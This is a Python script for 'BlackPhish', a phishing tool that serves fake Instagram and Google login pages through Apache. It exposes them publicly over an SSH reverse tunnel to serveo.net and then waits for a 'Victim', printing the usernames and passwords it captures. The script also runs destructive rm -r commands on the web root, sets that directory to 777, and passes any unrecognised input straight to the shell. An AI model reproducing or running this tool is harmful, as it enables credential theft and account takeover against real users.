#!/usr/bin/python3

# version 3: - Finshed

# Please update version number each time we update


# Libraries #
try:
    import os
    from time import sleep
    import socket
    from distutils.dir_util import copy_tree
except ImportError:
    print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
    exit(1)

# Variables #
cwd = os.getcwd()

# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"

# Check for root #
if os.geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)

def checkInternet():
    print(yellow + "[*] Checking connection...")
    try:
        socket.create_connection(("www.google.com", 80))
        print(green + "[+] Internet Found")
        sleep(2)
    except OSError:
        print(red + "[!] Internet Not Found" + reset)
        exit(0)
    
# Port forward to serveo #
def serveoForward():
    os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')

# Banner #
def banner():
    print('''
 \033[91;1m
                https://github.com/iinc0gnit0/BlackPhish \033[94;1m \033[5m

                             ░███░                                   ░█░   
                           ░█████                                  ░███    
                          ▒█████▓                                ░███░     
                         ████████                               ████▓      
                       ░█████████░                            ░█████       
                     ░█████████████                          ░██████       
          ░░▒███████████████████████████░░░                 ▓██████░       
 ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
█████████████████████████████████████████████████████████████████          
 ░████████████████████████████████████████████████████████████████░        
     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
             ░░░░▒█████████████████████░████░                  ░█████░     
                  ██████                 ░                                 
                  ░█████                                                   
                   ░████                                                   
                    ░███                                                   
                      ░█      
                                                      \033[0m\033[91m
        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
        
                
                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
                    
                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m
                    
                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
                    
                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[91;1m
                    
                    
                    
        [1]\033[94;1m Instagram \033[91;1m
        
        [2]\033[94;1m Google
        
        
        \033[0m''')
    
def endMessage():
    print("\n")
    print(red + "  Thank you using BlackPhish\n")
    print(red + "  If you have any problems while using BlackPhish please report it to us\n")
    print(red + "  Make Pull Request to support this tool\n")
    print("\n" + reset)
    exit(0)

# Main Script #
def main():
    os.system("clear")
    
    checkInternet()

    os.system('clear') # clear #
    banner() # Load Banner #
    choice = input(red + "        [BlackPhish] -> ") # Get user input #

    # Host Instagram Page #
    if choice == "1":
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        os.system('cp '+'-r '+ cwd  + '/Websites/Instagram/Instagram-Login/index.html' " /var/www/html/")
        print(green + '[+] Starting Apache2 Service')
        os.system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        serveoForward()
        print(green + '[+] Serveo is working')
        print(green + '[+] Done')
        main()
        
    # Host Google Page #
    elif choice == '2':
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        print(green + '[+] Cleaning /Server/www/')
        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
        copy_tree("Websites/Google", "Server/www")
        copy_tree("Server/www", "/var/www/html")
        print(green + '[+] Coping to /var/www/html')
        os.system("chmod -R 777 /var/www/html")
        print(green + '[+] Changing File Permissions')
        print(green + '[+] Starting Apache2 Service')
        os.system('service apache2 start')
        print(green + '[+] Apache2 Service Started')
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        while True:
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n')
                    os.system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()
                    
        print(green + '[+] Serveo is working')
        print(green + '[+] Done')
        main()

    # Clear #
    elif choice == "clear":
        os.system('clear')
        main()

    # Clean out everything #
    elif choice == "clean":
        print(green + '[+] Stopping Apache2 Service')
        os.system('service apache2 stop')
        print(green + '[+] Stopping Traffic forwarding to serveo')
        os.system('pkill -f inc0gnit0:80:localhost:80')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
        print(green + '[+] Cleaning /Server/www/')
        os.system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")
        print(green + '[+] Done')
        main()
    
    # Exit #
    elif choice == 'exit':
        print(red + '[!] Exiting...')
        print(green + '[+] Have a nice day!')
    
    # Use shell #
    elif choice != "":
        os.system(""+choice)
        main()

    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()
        
# This will start the script #
try:
    if __name__ == '__main__':
        main()
        
# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)